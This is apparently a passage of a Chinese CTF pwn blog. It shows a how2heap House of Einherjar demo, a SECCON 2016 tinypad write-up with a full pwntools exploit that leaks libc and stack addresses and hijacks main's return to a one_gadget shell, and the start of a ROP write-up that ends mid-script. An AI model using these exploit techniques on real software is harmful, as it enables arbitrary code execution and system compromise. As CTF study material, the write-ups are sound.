a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">  a[<span class="number">2</span>] = (<span class="type">size_t</span>)a; <span class="comment">// fwd</span></span><br><span class="line">  a[<span class="number">3</span>] = (<span class="type">size_t</span>)a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">   * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span></span><br><span class="line"><span class="comment">   * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* c = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">  <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//覆写c的previnuse位为0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">  b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">    <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="comment">//覆写c的prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;b[real_b_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size 来绕过unlink的大小检查</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">  a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* x[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="comment">//free c后就会把b包裹起来放入unsortedbin里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">  <span class="comment">//d会把b再次申请出来</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tcache poisoning</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">  <span class="comment">//这里主要是防止后面申请堆块时 tcache_index&lt;0导致失败</span></span><br><span class="line">  <span class="type">uint8_t</span>* pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">  <span class="comment">//修改tcache里b的下一个位空闲堆位目标地址</span></span><br><span class="line">  d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert(e == stack_var);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是和tcache poisoning配合来使用了 利用堆块b来覆写c的prevsize和previnuse为到fakechunk的a块，freec后触发合并并绕过unlink b堆块还在使用但是被包裹放入unsortedbin里</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730223649416.png" alt="image-20230730223649416"></p><p>intptr_t* d &#x3D; malloc(0x158);会把b申请到d里，后面free掉b链入tcache</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224051202.png" alt="image-20230730224051202"></p><p>后面再利用d来覆写b的下一个空闲堆块为目标地址</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224245777.png" alt="image-20230730224245777">、</p><p>就可以申请出来了</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>libc 2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/m/h/s/c/p/h/<span class="number">2016</span>_seccon_tinypad&gt; checksec tinypad </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/2016_seccon_tinypad/tinypad&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>自定的read_until有off by one的漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_until</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">int</span> <span class="built_in">terminate</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n = read_n(<span class="number">0LL</span>, &amp;a1[i], <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !n || a1[i] == <span class="built_in">terminate</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    dummyinput(<span class="built_in">terminate</span>);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete时存在只是置零了大小，存在uaf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="type">void</span> **)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">248</span>]);</span><br><span class="line">*(_QWORD *)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">240</span>] = <span class="number">0LL</span>;</span><br><span class="line">writeln(<span class="string">&quot;\nDeleted.&quot;</span>, <span class="number">9uLL</span>);</span><br></pre></td></tr></table></figure><p>思路就是uaf泄露libc和heapbase，然后利用off by one来造成堆块重叠 就是2.31how2heap的例子，利用edit功能把管理区tinypad+256链入fastbin链表，申请到tinypad+256的管理区，由于edit功能时用来当前区域所存数据大小来作为重新读入的大小所以不能打free malloc的hook，只能利用environ全局变量，来泄露栈地址来覆盖main的返回地址为ogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Is it OK?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x040098C&#x27;)#menu show</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x00400E17&#x27;)#edit</span></span><br><span class="line"><span class="comment">#leak heapbase</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 3\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">4</span>))-<span class="number">0x30</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line">system=libcelf.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">free_hook=libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">chun1=heapbase</span><br><span class="line">chun2=heapbase+<span class="number">0x30</span></span><br><span class="line">chun3=heapbase+<span class="number">0x60</span></span><br><span class="line">add(<span class="number">0x28</span>,flat(<span class="number">0</span>,<span class="number">0x20</span>,chun1+<span class="number">0x10</span>,chun1+<span class="number">0x10</span>,<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(chun3-chun1-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">256</span>+<span class="number">0x0602040</span>-<span class="number">8</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x31</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#绕过fastbin的大小检查</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line">enviorn=libcbase+libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,flat(enviorn,<span class="number">0x31</span>,<span class="number">256</span>+<span class="number">0x0602040</span>+<span class="number">8</span>))</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffebf17a478</span>-<span class="number">0x7ffebf17a388</span>)</span><br><span class="line">p(<span class="string">&#x27;ret&#x27;</span>,main_ret)</span><br><span class="line">ogg=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>,p64(ogg))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>写完之后去看了一眼wp，发现edit里会先把输入读到tinypad，可以直接用tinypad的区域来构造fakechunk，利用house of ejinherjar来申请到tinypad，这里要注意的是要在tinypad至少+0x20的位置去伪造fakechunk，因为后面申请的堆最大才0x100，太菜了刚开始没看出来呜呜</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 巅峰极客 pwn</title>
      <link href="/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"/>
      <url>/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>main函数栈溢出，但是没有可以泄露的常规方法</p><p>使用ropper可以发现一段gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040076</span>D B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000400772</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000400773</span> C3                            retn</span><br></pre></td></tr></table></figure><p>main函数返回时mov eax，0所以可以利用这段gadget把rbp - 8处的数据读到0x601020 .bss处</p><ul><li><p>把read的got读到0x601020附近</p></li><li><p>把读到bss段的read最后一位改为0x90 即syscall地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble read</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __GI___libc_read:</span><br><span class="line">   <span class="number">0x00007fb1a3514980</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line">   <span class="number">0x00007fb1a3514984</span> &lt;+<span class="number">4</span>&gt;:     mov    eax,DWORD PTR fs:<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x00007fb1a351498c</span> &lt;+<span class="number">12</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00007fb1a351498e</span> &lt;+<span class="number">14</span>&gt;:    jne    <span class="number">0x7fb1a35149a0</span> &lt;__GI___libc_read+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x00007fb1a3514990</span> &lt;+<span class="number">16</span>&gt;:    syscall</span><br></pre></td></tr></table></figure></li><li><p>利用gadget控制参数执行调用号为0x3B的sys_execve系统调用</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ezzzz&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span 